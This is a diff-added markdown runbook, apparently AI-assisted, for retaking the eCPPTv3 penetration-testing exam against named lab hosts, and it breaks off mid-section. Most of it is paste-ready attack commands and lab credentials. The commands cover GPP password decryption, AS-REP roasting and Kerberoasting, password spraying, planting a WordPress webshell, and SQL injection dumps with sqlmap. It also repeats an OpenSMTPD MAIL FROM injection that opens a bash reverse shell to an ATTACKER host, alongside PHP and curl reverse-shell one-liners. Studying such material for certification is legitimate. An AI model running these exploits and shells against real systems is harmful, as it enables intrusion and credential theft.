@@ -1,0 +1,845 @@
+# E Cpptv3 Retake – 120‑minute Runbook, Playbooks & Flowcharts (paul)
+
+# eCPPTv3 Retake – 120‑Minute Runbook, Playbooks & Flowcharts
+
+**Scope** Targets/hosts from your notes: 172.31.37.55 (Linux WP), 172.31.37.101 (WS01 – SSH/RDP/VNC/Werkzeug), 172.31.45.221 (FILESRV01 – SMB), 172.31.40.162 (DC02), 172.31.40.89 (DC01), 172.31.37.83 (Win 2019). Known creds you’ve observed include `hq.vanguard.bank\\jsmith:pa55w0rd` (SMB), `root:Spring2015…2017` (WS01 RDP), and multiple weak WordPress/RDP combos.
+
+**Goal** Reach ≥70% by maximizing fast wins: SMB/GPP → AD creds → DA path, Web (WordPress/plugin/SMTP/8080) → shell → DB → flags, WS01 local PE, and KeePass offline crack.
+
+---
+
+## 0–120 Minute Exam‑Day Sprint (Strict Order)
+
+### Phase 1 — First 15–20 min (Confirm scope & grab easy creds)
+
+1. **Baseline scan (fast)**
+
+```
+sudo nmap -Pn -T4 -F -oN nmap_fast.txt 172.31.37.0/24 172.31.40.0/24 172.31.45.0/24
+```
+
+1. **Known wins immediately**
+
+```
+# FILESRV01 – confirm working domain creds + enumerate shares fast
+crackmapexec smb 172.31.45.221 -u jsmith -p 'pa55w0rd' --shares
+smbclient //172.31.45.221/SYSVOL -U 'hq.vanguard.bank\\jsmith%pa55w0rd'
+# GPP loot
+cd SYSVOL/hq.vanguard.bank/Policies
+find . -iname "Groups.xml" -o -iname "ScheduledTasks.xml" -o -iname "Services.xml" -o -iname "Printers.xml"
+# If cpassword found:
+grep -i cpassword -R . | tee gpp_cpass.txt
+# Decrypt cpassword (Kali has gpp-decrypt)
+cat gpp_cpass.txt | awk -F'cpassword=|"' '{print $3}' | while read C; do gpp-decrypt "$C"; done | tee gpp_clear.txt
+```
+
+> Decision: If you get a local admin/domain admin from GPP, pivot immediately to WinRM/RDP/SMB and collect required flags/answers on DC01/DC02.
+> 
+1. **WS01 quick try** (you reported `root:Spring2015–2017` on 3389):
+
+```
+xfreerdp /v:172.31.37.101 /u:root /p:Spring2015 /cert:ignore
+```
+
+If in: start local PE quick‑hits (below) and loot.
+
+1. **WordPress quick enumeration**
+
+```
+wpscan --url http://172.31.37.55 --enumerate u,vp --plugins-detection aggressive \
+  --passwords /usr/share/wordlists/fasttrack.txt -o wpscan.txt
+# If XML-RPC enabled, try multi-auth via xmlrpc
+msfconsole -q -x "use auxiliary/scanner/http/wordpress_xmlrpc_login; set RHOSTS 172.31.37.55; set USERNAME admin; set PASS_FILE /usr/share/wordlists/fasttrack.txt; run; exit"
+```
+
+Note detected vulnerable plugin names/versions for Q&A and exploitation.
+
+---
+
+### Phase 2 — Minute 20–60 (Web shells / SMTP / 8080 / DB)
+
+1. **If WP plugin suggests upload/RCE** (e.g., file manager, theme editor, vulnerable plugin):
+- Try authenticated file upload to `wp-content/uploads/` or plugin upload route.
+- Drop a simple PHP webshell (if allowed) or use Metasploit module for the specific plugin if present offline.
+- Once **www-data** shell lands: `cat /var/www/html/wp-config.php` → DB creds → MySQL loot/flags.
+
+```
+# After shell
+php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+# DB creds
+grep -E "DB_(NAME|USER|PASSWORD|HOST)" /var/www/html/wp-config.php
+mysql -h 127.0.0.1 -u <DBUSER> -p'<DBPASS>' -e "SHOW DATABASES; USE wordpress; SELECT ID,user_login,user_pass FROM wp_users;"
+```
+
+1. **OpenSMTPD RCE re‑try (target 25/tcp)**
+- Banner grab with `nc`.
+- Manual `MAIL FROM` injection test to a netcat listener.
+
+```
+# Listener
+nc -lvnp 4444
+# Payload test
+(echo "EHLO test"; sleep 1; echo "MAIL FROM:<;bash -i >& /dev/tcp/ATTACKER/4444 0>&1;>"; \
+sleep 1; echo "RCPT TO:<root@localhost>"; sleep 1; echo "DATA"; sleep 1; echo "x"; echo "."; sleep 1; echo "QUIT") | nc -nv 172.31.37.55 25
+```
+
+If no shell: try `perl/python` one‑liners; try alternate egress ports (53, 443, 8080).
+
+1. **Port 8080 (likely Java app)** — fingerprint for **Apache Shiro**
+- Look for `rememberMe=deleteMe` cookie after hitting `/login`.
+- If present, try **Metasploit** `multi/http/shiro_rememberme` module with default key; else treat as Auth Bypass/Traversal if endpoints leak.
+
+```
+nmap -p8080 --script http-enum 172.31.37.55 -oN http8080_enum.txt
+curl -I http://172.31.37.55:8080/
+```
+
+> Record version strings for the Apache Shiro version question.
+> 
+
+---
+
+### Phase 3 — Minute 60–120 (AD & Windows push)
+
+1. **LDAP/AD enumeration with working domain creds** (jsmith):
+
+```
+# Count users, groups, OU contents
+ldapsearch -x -H ldap://172.31.40.162 -D 'hq.vanguard.bank\\jsmith' -w 'pa55w0rd' -b 'DC=hq,DC=vanguard,DC=bank' \
+  '(objectClass=user)' sAMAccountName | grep ^sAMAccountName | awk '{print $2}' | tee ad_users.txt
+# Exclude Administrator, Guest, krbtgt when answering counts
+
+# AS-REP roast (no preauth required)
+GetNPUsers.py hq.vanguard.bank/ -dc-ip 172.31.40.162 -usersfile ad_users.txt -format hashcat -no-pass -outputfile asrep_hashes.txt
+# Kerberoast
+GetUserSPNs.py hq.vanguard.bank/jsmith:'pa55w0rd' -dc-ip 172.31.40.162 -request -outputfile tgs_hashes.txt
+
+# Spray (fast, cautious)
+crackmapexec smb 172.31.40.162 -u ad_users.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success | tee spray_dc02.txt
+```
+
+> Hashcat modes reminder: AS‑REP → 18200; Kerberoast (TGS‑REP) → 13100.
+> 
+1. **GPP + SYSVOL full sweep** (for more cpasswords/scripts)
+
+```
+smbclient //172.31.40.162/SYSVOL -U 'hq.vanguard.bank\\jsmith%pa55w0rd' -c 'prompt off; recurse; mget *'
+grep -iE 'cpassword|userName|password' -R SYSVOL | tee gpp_more.txt
+```
+
+1. **With any admin cred** → **WinRM/SMB exec** and loot flags
+
+```
+# WinRM
+evil-winrm -i 172.31.40.162 -u <ADMIN> -p '<PASS>'
+# Or PsExec (if SMB admin)
+impacket-psexec hq.vanguard.bank/<ADMIN>:'<PASS>'@172.31.40.162 cmd.exe
+```
+
+---
+
+## Per‑Service Playbooks (Fast First)
+
+### SMB / GPP (Windows)
+
+- `cme smb <IP/CIDR> -u jsmith -p 'pa55w0rd' --shares --sessions --users`
+- Mount `SYSVOL`/`NETLOGON` → hunt `Groups.xml`, `ScheduledTasks.xml`, `Services.xml` for **cpassword**.
+- Decrypt with `gpp-decrypt`; test creds on DCs/Servers (WinRM/SMB/RDP).
+
+### LDAP/AD
+
+- `ldapsearch … '(objectClass=user)' sAMAccountName` → counts & spray list.
+- `GetNPUsers.py` (AS‑REP), `GetUserSPNs.py` (Kerberoast) → hashcat 18200 / 13100.
+- Group/OU Q’s: `ldapsearch '(objectClass=group)' cn member` and filter OU=Employees.
+
+### WordPress
+
+- `wpscan --enumerate u,vp` (record **WP version** + **vuln plugin** for Qs).
+- Try XML‑RPC mass login; if any auth → upload shell via theme/plugin/editor or specific plugin module.
+- From shell: `wp-config.php` → MySQL creds → dump `wp_users` for user count/hash alg (usually **phpass**/Portable PHP).
+
+### SMTP (OpenSMTPD)
+
+- Banner/version capture.
+- Manual `MAIL FROM` RCE test with `bash/perl/python` revshells; adjust egress ports.
+- If command injection works but reverse fails, try **apt‑get curl/wget** to fetch a webshell (if net allowed) or write to a writable web path when combined with Apache.
+
+### Port 8080 (Java/Shiro/WebDAV?)
+
+- `curl -I` and `http-enum` to fingerprint.
+- If **Shiro** cookie observed → `multi/http/shiro_rememberme` default key attempt.
+- If **WebDAV**: `OPTIONS` for `PROPFIND/PUT`; attempt `PUT` of webshell where executable.
+
+### RDP/WinRM/VNC
+
+- Known creds first; record NLA/NTLM status.
+- VNC: `nmap --script vnc-info -p 5900-5911 <IP>`; try empty password quickly.
+
+### MySQL
+
+- Once WP shell → `wp-config.php` to get DB creds; dump `wp_users`.
+- Answer questions: **root password** (if reused), **user count**, **decoded flag** (base64 in table often), **hash alg** (phpass/MD5).
+
+---
+
+## Windows PE Quick‑Hits (WS01/Servers)
+
+1. **Unquoted Service Path** (most likely per exam pattern)
+
+```
+Get-CimInstance Win32_Service | ? { $_.PathName -and $_.PathName -notmatch '"' -and $_.StartMode -eq 'Auto' } | select Name,PathName
+```
+
+- If service path has spaces and is unquoted, drop a payload in the first writable path segment, restart service (or wait for reboot/service restart).
+1. **Token impersonation**
+
+```
+whoami /priv
+# If SeImpersonatePrivilege present, use PrintSpoofer/RoguePotato equivalents (if available in the lab toolset)
+```
+
+1. **UAC bypass** (if local admin but not high): `fodhelper`/`sdclt` patterns (depends on availability).
+2. **Looting**
+- `C:\Users\*\Desktop`, `C:\ProgramData\`, `C:\Windows\Temp\` for creds/flags.
+- `reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword`
+
+---
+
+## Linux PE Quick‑Hits (Web host)
+
+- `sudo -l` (common misconfigs)
+- SUID scan: `find / -perm -4000 -type f 2>/dev/null`
+- Capabilities: `getcap -r / 2>/dev/null`
+- Cron/jobs: `/etc/crontab`, `/etc/cron.*/*`
+- Writable paths in service chains; PATH hijack if root‑executed scripts.
+
+---
+
+## KeePass / KeeSafe Workflow (via FILESRV01)
+
+1. Search and pull:
+
+```
+grep -iE '\\.kdbx|KeePass|KeePass.config.xml|KeePass*' -R .
+```
+
+1. Crack offline:
+
+```
+keepass2john database.kdbx > kp_hash.txt
+john kp_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=single --fork=4
+```
+
+1. Also search for **key files** (`.key`, `.keyx`) and notes (`.txt/.xml`) that leak the master password/clues.
+
+---
+
+## Pivot & Proxy (if needed)
+
+- **Port forward** to internal web only hosts via Meterpreter (if obtained):
+
+```
+portfwd add -L 127.0.0.1 -l 8888 -p 80 -r <internal-ip>
+```
+
+- **SOCKS proxy** with Metasploit → `proxychains` for Nmap/WPScan against internal.
+
+---
+
+## “Answer the Question Bank” – How‑To Map
+
+(You collect each answer with these one‑liners/short steps.)
+
+- **PDC IP / #Linux / #Windows / #DCs / WebDAV count**: your fast Nmap + targeted scripts (`http-webdav-scan`, `smb-os-discovery`).
+- **Apache on WP host**: `curl -I http://172.31.37.55 | grep -i Server` (or `apache2ctl -v` from shell).
+- **Apache Shiro version**: headers/`/assets`/`/WEB-INF/lib/` listing via traversal if possible; or record from app banner.
+- **Domain users total**: `ldapsearch` count; exclude `Administrator, Guest, krbtgt`.
+- **Local RDP user on FILESRV01**: `net localgroup "Remote Desktop Users"` or `query user` when you have access.
+- **Spray‑susceptible user**: determined from your CME spray results.
+- **WP user count/version/hash alg**: MySQL `wp_users` dump; WP version via `wp-includes/version.php` or WPScan output; password hash alg usually **phpass (Portable PHP)**.
+- **8080 vuln type**: from fingerprint/exploit result (Shiro = **Auth bypass/RCE via deserialization**; else as discovered).
+- **OpenSMTPD exploit flag/ vuln type**: manual RCE → capture decoded flag; vuln type = **RCE**.
+- **MySQL root password & decoded flag**: from `wp-config.php` creds and DB enumeration; base64 decode as needed.
+- **WS01 PE vuln**: very likely **Unquoted Service Path** per lab pattern; verify with PowerShell one‑liner above.
+- **Clear‑text passwords** (Admin/nathan/DC02 Admin): from GPP/SYSVOL, KeePass, or local files/registry.
+- **DC name in creds file**: search `C:\` recursively for `pass*`, `cred*`, `todo*`, `notes*` after you have access.
+- **Master password (KeePass2)**: crack or find in notes/config.
+- **Auth protocol w/out admin**: **WinRM requires admin by default** → answer is usually **Kerberos** or **LDAP**; but per question phrasing “authenticate to a Windows host as a local user without Admin privileges” the practical client is **WinRM = NO**, **Kerberos/LDAP = directory auth**, **PsExec = requires admin**. Capture from your enumeration.
+- **Hashcat hashmode for TGT**: if they mean **AS‑REP** → 18200; if **Kerberoast (TGS)** → 13100. Pick based on which you actually captured.
+- **AS‑REP roastable account**: from `GetNPUsers.py` output.
+- **Enterprise Admins name/password**: from SYSVOL/KeePass/roasting.
+- **Final flags (paths given)**: grab once DA/local admin achieved.
+
+---
+
+## Don’t Waste Time (from your last run)
+
+- Don’t sit on Metasploit payload mismatch errors—switch to simple `bash/perl/python` reverse shells.
+- Don’t brute‑force huge lists on RDP/WP; use **fasttrack** and the season/year patterns you already saw.
+- Don’t over‑enumerate filtered hosts.
+- If WP path stalls, jump to **GPP/SYSVOL** and **AS‑REP/Kerberoast**—those often yield DA faster.
+
+---
+
+## Minimal Command Blocks (Paste‑Ready)
+
+```
+# 1) Prove jsmith works and loot GPP quickly
+crackmapexec smb 172.31.45.221 -u jsmith -p 'pa55w0rd' --shares
+smbclient //172.31.45.221/SYSVOL -U 'hq.vanguard.bank\jsmith%pa55w0rd' -c 'recurse ON; prompt OFF; mget *'
+grep -i cpassword -R SYSVOL | awk -F'cpassword=|"' '{print $3}' | while read C; do gpp-decrypt "$C"; done
+
+# 2) AD roast + spray
+ldapsearch -x -H ldap://172.31.40.162 -D 'hq.vanguard.bank\jsmith' -w 'pa55w0rd' -b 'DC=hq,DC=vanguard,DC=bank' '(objectClass=user)' sAMAccountName | awk '{print $2}' > ad_users.txt
+GetNPUsers.py hq.vanguard.bank/ -dc-ip 172.31.40.162 -usersfile ad_users.txt -format hashcat -no-pass -outputfile asrep.txt
+GetUserSPNs.py hq.vanguard.bank/jsmith:'pa55w0rd' -dc-ip 172.31.40.162 -request -outputfile tgs.txt
+crackmapexec smb 172.31.40.162 -u ad_users.txt -p /usr/share/wordlists/fasttrack.txt --continue-on-success | tee spray_dc02.txt
+
+# 3) WP → DB
+wpscan --url http://172.31.37.55 --enumerate u,vp -o wpscan.txt
+# after shell:
+grep DB_ /var/www/html/wp-config.php
+mysql -h 127.0.0.1 -u <DBUSER> -p'<DBPASS>' -e "USE wordpress; SELECT user_login,user_pass FROM wp_users;"
+
+# 4) OpenSMTPD manual RCE
+nc -lvnp 4444
+(echo "EHLO x"; sleep 1; echo "MAIL FROM:<;bash -i >& /dev/tcp/ATTACKER/4444 0>&1;>"; sleep 1; echo "RCPT TO:<root@localhost>"; sleep 1; echo "DATA"; sleep 1; echo "."; sleep 1; echo "QUIT") | nc -nv 172.31.37.55 25
+```
+
+---
+
+## ASCII Flowcharts (Follow These Paths)
+
+### A) Windows / AD Path
+
+```
+[Start]
+  ├─▶ Test jsmith on FILESRV01 SMB → Shares?
+  │       ├─▶ Yes → Pull SYSVOL/NETLOGON → GPP cpassword?
+  │       │       ├─▶ Yes → Decrypt → Admin creds → WinRM/SMB exec on DCs → Flags
+  │       │       └─▶ No  → LDAP list users → AS‑REP/Kerberoast → crack → Admin? → Exec → Flags
+  │       └─▶ No  → Try DCs directly with jsmith for read SYSVOL → repeat GPP step
+  └─▶ Parallel: RDP WS01 (root:Spring2015) → Local PE → Loot creds → Re‑test DCs
+```
+
+### B) Web Path (Linux WP host)
+
+```
+WPScan → Users/Plugins → Valid login?
+  ├─▶ Yes → Upload shell → Read wp-config.php → MySQL creds → Dump wp_users (answers) → PrivEsc (sudo/SUID) → Flag
+  └─▶ No  → XML‑RPC brute (fast) → Plugin RCE? → or Port 8080 (Shiro?) → try deserialization RCE → Shell → continue
+SMTP 25 → Manual MAIL FROM RCE → Shell (if succeeds) → same DB/PE path
+```
+
+---
+
+## Reset Recovery (5‑minute checklist)
+
+- Re‑run **CME SMB** against FILESRV01 and DCs with `jsmith`.
+- Pull **SYSVOL** and re‑decrypt **GPP**.
+- **WS01 RDP** with `root:Spring2015` again; re‑run unquoted service check.
+- **WPScan** (u,vp) only; don’t brute full RockYou—stick to fasttrack + season/year.
+- **AS‑REP/Kerberoast** using preserved `ad_users.txt` template; hashcat modes 18200/13100.
+
+---
+
+## Notes & Reminders
+
+- Keep a small `answers.txt` to fill as you go (counts, versions, flags).
+- Screenshot key proof (flags, command outputs) as you capture.
+- If a path stalls >10 minutes, switch tracks (Windows ↔︎ Web) to keep momentum.
+
+---
+
+# Host-by-Host Attack Plans (from your scans)
+
+Below are **strict-order playbooks** keyed to each host you pasted. Each block ends in a **stop/branch** so you don’t overwork dead ends.
+
+## 172.31.37.55 – Linux (WP + SMTP + SSH:2222 + RDP + :8080)
+
+**Goal:** Auth → WP shell → DB loot → local PE → flag. Parallel: SMTP RCE; 8080 fingerprint.
+
+**Top 10 in order**
+
+1. **WP users & vulns (fast)**
+
+```
+wpscan --url http://172.31.37.55 --enumerate u,vp,vt --plugins-detection aggressive -o wps_55.txt
+```
+
+1. **Login using known cracked combos** (from your list). Prioritise:
+- `admin` / {123456, 12345, password, 123456789, 12345678}
+- `webmin`, `Flag Hunter`, `charlie-WS01` with the same weak set.
+1. **If login works** → **upload shell**
+- Theme editor: Appearance → Theme File Editor → add `<?php system($_GET['cmd']);?>` to `404.php`.
+- Or upload a tiny webshell via Media + plugin (if allowed).
+1. **Reverse shell** (once webshell reachable)
+
+```
+curl "http://172.31.37.55/wp-content/themes/<theme>/404.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
+```
+
+1. **DB creds & dump**
+
+```
+grep -E "DB_(NAME|USER|PASSWORD|HOST)" /var/www/html/wp-config.php
+mysql -h 127.0.0.1 -u <DBUSER> -p'<DBPASS>' -e "USE wordpress; SELECT ID,user_login,user_pass FROM wp_users;"
+```
+
+→ Fill Q: WP version (also `cat wp-includes/version.php`), user count, hash alg (usually `phpass`), decoded flag if present in DB (often base64 in a custom table/option). 6) **Linux PE quick hits**
+
+```
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+cat /etc/crontab; ls -lah /etc/cron.*
+```
+
+1. **SMTP 25 Manual RCE test (parallel if WP stalls)**
+
+```
+nc -lvnp 4444
+(echo "EHLO x"; sleep 1; echo "MAIL FROM:<;bash -i >& /dev/tcp/ATTACKER/4444 0>&1;>"; \
+sleep 1; echo "RCPT TO:<root@localhost>"; sleep 1; echo "DATA"; sleep 1; echo "x"; echo "."; sleep 1; echo "QUIT") | nc -nv 172.31.37.55 25
+```
+
+- If no shell: try `perl`/`python` one-liners, or change egress to 53/443/8080.
+1. **Port 8080** – fingerprint for Shiro/WebDAV/Proxy
+
+```
+nmap -p8080 --script http-headers,http-title,http-enum 172.31.37.55 -oN 8080_55.txt
+curl -I http://172.31.37.55:8080/
+```
+
+- If cookie `rememberMe=deleteMe` → explore Shiro deserialization path (record version for Q).
+- If WebDAV: `OPTIONS` shows `PUT/PROPFIND` → attempt `PUT` of webshell.
+1. **RDP 3389** – only fast spray with **very small** list; don’t burn time.
+2. **SSH 2222** – only try if DB/WP leaked creds or reused weak creds.
+
+**Branch:** If WP/SMTP/8080 yield **no shell in 20–25 min**, pivot to Windows/AD path (below) and return later.
+
+---
+
+## 172.31.37.101 – “WS01” (Linux + xrdp + VNC + Werkzeug 3.0.2 @45656)
+
+**Goal:** Get in via RDP weak creds; local PE for loot; check Python app.
+
+**Top 8 in order**
+
+1. **RDP quick tries (you reported success before)**
+
+```
+xfreerdp /v:172.31.37.101 /u:root /p:Spring2015 /cert:ignore
+```
+
+Try 2016/2017 only if 2015 fails. Stop after 2–3 tries. 2) **If in** → **local PE** (unquoted svc path is Windows pattern; here it’s Linux → focus on sudo/SUID/cron):
+
+```
+whoami; id; sudo -l; find / -perm -4000 -type f 2>/dev/null
+getcap -r / 2>/dev/null
+ls -lah /etc/sudoers.d /etc/cron.*
+```
+
+1. **VNC 5910/5911** – try empty/`password` quickly, else park.
+
+```
+nmap --script vnc-info -p 5910,5911 172.31.37.101
+```
+
+1. **Port 45656 (Werkzeug/Flask) enum**
+
+```
+curl -i http://172.31.37.101:45656/
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://172.31.37.101:45656/FUZZ -mc all -fs 0
+```
+
+- Look for a **debug console exposure**. If interactive debugger with pin → hunt for pin derivation files (Werkzeug classic pitfall). If not, treat as standard Flask app (IDOR, SSTI `{{7*7}}`).
+1. **RDP/SSH brute** – only with **fasttrack** if absolutely needed. Don’t run RockYou here.
+2. **Loot** any stored creds/configs once in. Try them on FILESRV/DCs.
+
+**Branch:** If no quick access, deprioritise and focus on FILESRV01 + AD.
+
+---
+
+## 172.31.37.83 – Windows Server 2019
+
+**Goal:** Use creds from AD/FILESRV to manage; direct exploit unlikely.
+
+**Top 5**
+
+1. Record RDP/WinRM availability. No MS17-010; MS12-020 unlikely on 2019.
+2. When you obtain creds (GPP/KeePass), test WinRM first:
+
+```
+evil-winrm -i 172.31.37.83 -u <USER> -p '<PASS>'
+```
+
+1. SMB enumerate sessions/shares with known creds:
+
+```
+crackmapexec smb 172.31.37.83 -u jsmith -p 'pa55w0rd' --shares --sessions
+```
+
+1. If local admin, dump quick loot (desktop flags, saved files).
+2. Otherwise, park and move on.
+
+---
+
+## 172.31.40.89 – DC01 (vanguard.bank)
+
+**Goal:** DA/flag path once creds found.
+
+**Top 6**
+
+1. **LDAP base facts** (names/OU counts for questions):
+
+```
+ldapsearch -x -H ldap://172.31.40.89 -D 'hq.vanguard.bank\jsmith' -w 'pa55w0rd' -b 'DC=vanguard,DC=bank' '(objectClass=user)' sAMAccountName | tee dc01_users.txt
+```
+
+1. **SYSVOL pull** (also provides policy/Q answers):
+
+```
+smbclient //172.31.40.89/SYSVOL -U 'hq.vanguard.bank\jsmith%pa55w0rd' -c 'recurse ON; prompt OFF; mget *'
+```
+
+1. **GPP cpassword hunt + decrypt** (repeat for DC02 as well).
+2. **AS‑REP/Kerberoast** using DC01 as KDC if needed.
+3. With any admin, **WinRM/PsExec** to capture flags and DC01-specific Q answers.
+4. Fill Q: **Enterprise Admin name(s)**, group membership counts, `Employees` OU group count, etc., via LDAP filters.
+
+---
+
+## 172.31.40.162 – DC02 (hq.vanguard.bank)
+
+**Goal:** Same as DC01; many questions reference DC02 explicitly in your bank.
+
+**Top 6**
+
+1. **LDAP enumerate** against DC02 base:
+
+```
+ldapsearch -x -H ldap://172.31.40.162 -D 'hq.vanguard.bank\jsmith' -w 'pa55w0rd' -b 'DC=hq,DC=vanguard,DC=bank' '(objectClass=user)' sAMAccountName | tee dc02_users.txt
+```
+
+1. **GetNPUsers / GetUserSPNs**
+
+```
+GetNPUsers.py hq.vanguard.bank/ -dc-ip 172.31.40.162 -usersfile dc02_users.txt -format hashcat -no-pass -outputfile asrep_dc02.txt
+GetUserSPNs.py hq.vanguard.bank/jsmith:'pa55w0rd' -dc-ip 172.31.40.162 -request -outputfile tgs_dc02.txt
+```
+
+1. **SYSVOL pull** + **GPP decrypt** from DC02.
+2. **Spray (tight)** with `fasttrack.txt`; stop on first success.
+3. On admin, **WinRM** → gather flags and the DC02‑specific password questions.
+4. Answer: **Hashcat mode**: AS‑REP 18200; Kerberoast 13100 (fill based on what you captured).
+
+---
+
+## 172.31.45.221 – FILESRV01
+
+**Goal:** Your best quick win → confirmed `jsmith:pa55w0rd`. Loot SYSVOL/NETLOGON, KeePass, local users.
+
+**Top 8**
+
+1. **Confirm creds + enumerate**
+
+```
+crackmapexec smb 172.31.45.221 -u jsmith -p 'pa55w0rd' --shares --sessions --users
+```
+
+1. **Mount and pull**
+
+```
+smbclient //172.31.45.221/SYSVOL -U 'hq.vanguard.bank\jsmith%pa55w0rd' -c 'recurse ON; prompt OFF; mget *'
+smbclient //172.31.45.221/NETLOGON -U 'hq.vanguard.bank\jsmith%pa55w0rd' -c 'recurse ON; prompt OFF; mget *'
+```
+
+1. **KeePass/KeeSafe sweep** (you saw kdbx/configs on this host family)
+
+```
+grep -iE '\.kdbx|KeePass|KeePass.config|KeePass.*xml|\.keyx?$' -R .
+```
+
+1. **Decrypt GPP cpasswords** found anywhere in pulled policies.
+
+```
+grep -i cpassword -R SYSVOL | awk -F'cpassword=|"' '{print $3}' | while read C; do gpp-decrypt "$C"; done
+```
+
+1. **Identify RDP local user** (for Q12) once you have a shell or with `net` via `wmiexec` if credentials allow.
+2. **Test newly found creds** on DC01/DC02 via WinRM.
+3. **If local admin on FILESRV01** → extract local hashes/clear-texts (LSA secrets) for Q30–Q33.
+4. **Record everything** for the password Qs (jack/kane/etc.) as you find them.
+
+---
+
+## 172.31.37.1 – Likely gateway
+
+No action. Treat as filtered infra.
+
+---
+
+# “Answer Capture” Sheet (fill as you go)
+
+**Infra counts**: PDC IP = [ ], # Linux = [ ], # Windows = [ ], # DCs = [ ]
+
+**Web/WP**: Apache ver = [2.4.41], WP ver = [6.7.1], WP users (excl admin) = [ ], Akismet vuln type = [ ], CVSS = [ ]
+
+**8080**: App/stack = [ ], Vuln type = [ ]
+
+**SMTP**: Vuln type = [ ], Decoded flag = [ ]
+
+**DB/MySQL**: root pw = [ ], wp_users count = [ ], hash alg = [ ], decoded flag from DB = [ ]
+
+**AD/LDAP**: domain user total (excl Administrator/Guest/krbtgt) = [ ]
+
+- Employees OU – groups = [ ], `noah` belongs to = [ ]
+- Spray‑susceptible user = (from CME spray)
+- # users vulnerable to spraying = [ ]
+- AS‑REP roastable = (from GetNPUsers)
+- Hashcat: TGT/AS‑REP mode used = [18200], TGS = [13100]
+
+**Windows local**: WS01 PE vuln = [ ], Admin clear‑text pw (WS01) = [ ]
+
+- FILESRV01 local RDP user = [ ], nathan clear‑text = [ ]
+- DC with creds file name (AB12 format) = [ ]
+- DC02 local Administrator password = [ ]
+- Enterprise Admin account name(s) = [ ], password = [ ]
+- DC01 Administrator desktop flag = [ ]
+
+---
+
+# Speed‑Dial Blocks (paste‑ready)
+
+```
+# GPP one‑liner (after pulling SYSVOL)
+grep -i cpassword -R SYSVOL | awk -F'cpassword=|"' '{print $3}' | while read C; do gpp-decrypt "$C"; done
+
+# LDAP counts (adjust base DN per DC)
+ldapsearch -x -H ldap://172.31.40.162 -D 'hq.vanguard.bank\jsmith' -w 'pa55w0rd' -b 'DC=hq,DC=vanguard,DC=bank' '(objectClass=user)' sAMAccountName | grep ^sAMAccountName | wc -l
+
+# AS‑REP and Kerberoast (Hashcat 18200 / 13100)
+GetNPUsers.py hq.vanguard.bank/ -dc-ip 172.31.40.162 -usersfile dc02_users.txt -format hashcat -no-pass -outputfile asrep.txt
+GetUserSPNs.py hq.vanguard.bank/jsmith:'pa55w0rd' -dc-ip 172.31.40.162 -request -outputfile tgs.txt
+
+# WP → DB quick dump (after shell)
+mysql -e "USE wordpress; SELECT user_login,user_pass FROM wp_users;"
+
+# SMTP manual RCE attempt (bash rev)
+(echo "EHLO x"; sleep 1; echo "MAIL FROM:<;bash -i >& /dev/tcp/ATTACKER/4444 0>&1;>"; sleep 1; echo "RCPT TO:<root@localhost>"; sleep 1; echo "DATA"; sleep 1; echo "x"; echo "."; sleep 1; echo "QUIT") | nc -nv 172.31.37.55 25
+```
+
+---
+
+# Timeboxing & Branch Rules
+
+- **Web path**: 25 minutes max to first shell. If not, switch to AD path.
+- **AD path**: 25–35 minutes to first elevated cred via GPP/roasting. If not, re-try WP with new intel.
+- **Brute‑forcing**: Only **fasttrack** lists; if no hit in 5–10 min, stop.
+- **Document**: Fill the capture sheet as you go; it directly maps to your question bank.
+
+---
+
+# Quick fixes from your screenshots (triage & corrections)
+
+**What I can confirm from the images you dropped:**
+
+- ✅ **SMB with ``*** works on DC02 and FILESRV01** — you listed shares like `NETLOGON`, `SYSVOL`, `CertEnroll`. Good: prioritise **SYSVOL pull → GPP decrypt**.
+- ✅ **Search/Login pages on **``: Confirmed **SQLi** on login and **search**; DOM shows `maxlength` attr you removed. Treat the login form as username‑only SQLi → use it to land as the first user (likely *bob*) and then harvest.
+- ✅ **WP enum**: WordPress resolved with multiple plugins detected. Keep **WP 6.7.1** as the authoritative version from your nmap/HTTP headers for the exam answers.
+- ⚠️ **OpenSMTPD exploit run shows **`* set to **` in msf — that’s the **target subnet**, not your attacker. This explains the “no session created.”
+    - **Fix**: `set LHOST <your_kali_ip>` (e.g., `10.x.x.x`), `set LPORT 4444`, start `nc -lvnp 4444` beforehand, and prefer `cmd/unix/reverse_bash`.
+    - If still no callback: try egress ports **53/443/8080**, or switch to manual `MAIL FROM` injection (blocks provided below).
+- ℹ️ **xfreerdp** errors (`transport read/wsa`): network hiccup or NLA fail. When creds are right, use: `/cert:ignore /sec:rdp /dynamic-resolution /network:auto`. Keep retries minimal.
+
+## Copy‑paste blocks (SMTP fix)
+
+```
+# 1) What’s my attacker IP (pick interface with route to 172.31.0.0/16)?
+ip -br a | awk '$1!~/lo/{print $1,$3}'
+
+# 2) Netcat listener
+nc -lvnp 4444
+
+# 3) Manual RCE in one line
+(echo "EHLO x"; sleep 1; echo "MAIL FROM:<;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1;>"; \
+sleep 1; echo "RCPT TO:<root@localhost>"; sleep 1; echo "DATA"; sleep 1; echo "."; sleep 1; echo "QUIT") | nc -nv 172.31.37.55 25
+
+# 4) Metasploit (only if you must)
+use exploit/unix/smtp/opensmtpd_mail_from_rce
+set RHOSTS 172.31.37.55
+set LHOST ATTACKER_IP
+set LPORT 4444
+set PAYLOAD cmd/unix/reverse_bash
+run
+```
+
+## SQLi → fast harvest (login & search)
+
+```
+# Save a real login POST as request.txt (Burp/Firefox devtools), then:
+sqlmap -r request.txt --batch --risk=2 --level=2 --dbs
+# Then enumerate user table quickly once DB is id’d
+sqlmap -r request.txt -D <db> -T users --columns --batch
+sqlmap -r request.txt -D <db> -T users -C id,username,email,password --dump --batch
+```
+
+Tips:
+
+- If login SQLi only takes **username**, try: `' OR 1=1 -- -` (or proper comment style) and observe which user you’re dropped in as; then pull **profile endpoints** seen in Network tab for flags.
+- For **search SQLi**, escalate from boolean/time‑based to UNION quickly. If blocked, use `-tamper` (`space2comment`, `between`, `equaltolike`).
+
+## enum4linux / CME syntax reminders
+
+```
+# Single password (works; seen in your screenshot)
